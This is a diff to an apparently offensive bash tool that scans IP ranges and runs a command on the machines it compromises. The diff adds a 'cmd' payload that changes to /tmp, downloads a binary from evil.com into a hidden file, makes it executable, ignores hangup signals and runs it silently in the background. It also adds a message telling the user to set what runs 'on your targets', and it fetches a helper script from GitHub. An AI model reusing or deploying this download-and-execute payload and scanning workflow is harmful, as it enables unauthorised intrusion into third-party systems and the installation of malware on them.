@@ -1,7 +1,9 @@
 #!/bin/bash
 server="your.ircd.or.whatever.com"
 keywords="$@"  # or hardcode them in
-
+# edit this:
+cmd="cd /tmp;wget -O .evil evil.com/binary;chmod +x .evil;trap \"\" 1; ./.evil >/dev/null 2>&1 &"
+echo 'Make sure you edit the script and define "cmd", which tells me what commands to run on your targets'
 if [[ "$#" -eq "0" ]] ; then
   echo "Usage: $0 \"keywords\\|go\\|here\\|in\\|this\\|\\greppable\\|format\" "
   exit 1
@@ -13,7 +15,7 @@ wget -O pycc https://raw.githubusercontent.com/isdrupter/evilsh/master/autobots/
 chmod +x pycc
 
 echo -n '
-#ip ranges to scan here
+#edit this : ip ranges to scan here
 1.2.3.0/24
 2.3.4.0/24
 4.5.0.0/16
